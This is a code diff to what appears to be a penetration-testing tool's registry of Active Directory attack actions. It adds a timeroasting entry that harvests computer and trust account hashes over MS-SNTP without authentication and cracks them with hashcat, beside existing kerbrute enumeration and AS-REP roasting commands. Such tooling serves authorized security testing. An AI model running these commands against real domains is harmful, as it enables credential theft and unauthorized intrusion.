@@ -352,6 +352,13 @@ ACTION_REGISTRY: dict[str, Action] = {
         ["kerbrute userenum -d $DOMAIN --dc $IP <userlist>"],
         runnable=False, outputs="raw",
         note="Validate a username list against the DC (no creds). Needs a wordlist."),
+    "timeroast_ntp": _a("timeroast_ntp",
+        ["sudo python3 timeroast.py $IP | tee ntp-hashes.txt",
+         "hashcat -m 31300 ntp-hashes.txt <wordlist>"],
+        runnable=False, outputs="raw",
+        note="Timeroasting: MS-SNTP returns a computer/trust account's RID-keyed hash with NO "
+             "auth. Crack offline (hashcat -m 31300); weak machine passwords are rare but trust "
+             "accounts and old computers sometimes crack."),
     "asreproast_users": _a("asreproast_users",
         ["impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -usersfile <userlist> -no-pass -format hashcat"],
         risk="propose", runnable=False, outputs="raw",
